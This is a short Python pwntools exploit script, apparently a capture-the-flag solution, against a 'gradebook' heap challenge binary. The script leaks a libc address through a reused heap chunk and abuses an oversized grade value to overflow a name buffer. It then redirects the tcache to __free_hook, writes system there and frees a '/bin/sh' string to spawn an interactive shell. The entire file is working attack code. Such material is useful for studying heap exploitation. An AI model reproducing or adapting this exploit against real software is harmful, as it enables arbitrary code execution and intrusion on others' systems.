from pwn import *

def create(s, ident, size, name):
    s.sendlineafter(b"> ", b'1')
    s.sendlineafter(b"id: ", ident)
    s.sendlineafter(b"length: ", str(size))
    s.sendafter(b"name: ", name)

def list_students(s):
    s.sendlineafter(b"> ", b'2')

def grade(s, ident, grade):
    s.sendlineafter(b"> ", b'3')
    s.sendlineafter(b"id: ", ident)
    s.sendlineafter(b"grade: ", str(grade))

def name(s, ident, name):
    s.sendlineafter(b"> ", b'4')
    s.sendlineafter(b"id: ", ident)
    s.sendafter(b"name: ", name)

def clear(s):
    s.sendlineafter(b"> ", b'5')

def go():
    s = process("./gradebook")#, env={"LD_PRELOAD" : "./libc.so.6"})
    libc = ELF("./libc.so.6")
    main_arena_offset = 0x1ebb80

    create(s, b"1", 0x1000, b"A"*0x1000)
    create(s, b"2", 0x18, b"B"*0x18)
    create(s, b"3", 0x18, b"C"*0x18)

    clear(s)

    # create(s, b"4", 0x18, b"D"*0x18)
    create(s, b"1", 0x1000, b"X"*7+b"|")

    list_students(s)

    s.recvuntil("|")
    libc_leak = s.recv(6) # main_arena+96
    libc_leak = u64(libc_leak.ljust(8, b'\x00'))

    libc.address = libc_leak - (main_arena_offset+96)

    log.info(f"libc leak    @ {hex(libc_leak)}")
    log.info(f"libc base    @ {hex(libc.address)}")

    grade(s, b"1", (0x1100 << 32) + 100)
    name(s, b"1", b"/bin/sh\x00" + b"X"*(0x1000) + p64(0x21) + p64(libc.symbols['__free_hook']))

    create(s, b"5", 0x40, b"A"*40)
    create(s, b"6", 0x18, p64(libc.symbols['system']))

    clear(s)

    s.interactive()

go()
